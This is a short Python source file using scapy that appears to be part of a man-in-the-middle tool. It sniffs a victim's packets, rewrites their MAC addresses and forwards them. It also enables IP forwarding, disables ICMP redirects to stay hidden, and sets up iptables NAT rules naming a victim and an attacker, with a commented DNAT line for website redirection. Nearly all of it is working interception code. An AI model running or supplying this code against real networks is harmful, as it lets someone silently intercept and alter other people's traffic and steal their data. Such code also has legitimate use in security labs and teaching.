from scapy.all import *
import subprocess

def forward(pkt, self_mac, dst_mac, interface):
	pkt[Ether].dst = dst_mac
	pkt[Ether].src = self_mac
	sendp(pkt, iface=interface)

def capture_and_forward(src_ip, dst_mac, self_mac, interface, callback):
	sniff(
		iface=interface, 
		store=False,
		prn=lambda p: forward(p, self_mac, dst_mac, interface),
		filter=f"src host {src_ip}")
	#callback(pkt)
		
def enable_forwarding():
	subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], check=True)
	
def run(cmd):
    subprocess.run(cmd, shell=True, check=True)

def setup_nat(router_ip, victim_ip, attacker_ip, interface):
    run(f"iptables -t nat -A POSTROUTING -s {router_ip} -d {victim_ip} -j SNAT --to-source {attacker_ip}")

    run(f"iptables -t nat -A POSTROUTING -s {victim_ip} -d {router_ip} -j SNAT --to-source {attacker_ip}")

def start_kernel_forwarding(router_ip, victim_ip, attacker_ip, interface):
        # Disable ICMP redirects
    run("sysctl -w net.ipv4.conf.all.send_redirects=0")
    run(f"sysctl -w net.ipv4.conf.{interface}.send_redirects=0")

    run("sysctl -w net.ipv4.conf.all.accept_redirects=0")
    run(f"sysctl -w net.ipv4.conf.{interface}.accept_redirects=0")
    
    # Enable IP forwarding
    run("sysctl -w net.ipv4.ip_forward=1")
    
    #setup_nat(router_ip, victim_ip, attacker_ip, interface)
    
	
#sudo iptables -t nat -A PREROUTING -d website -j DNAT --to-destination <WEBSITE_IP>
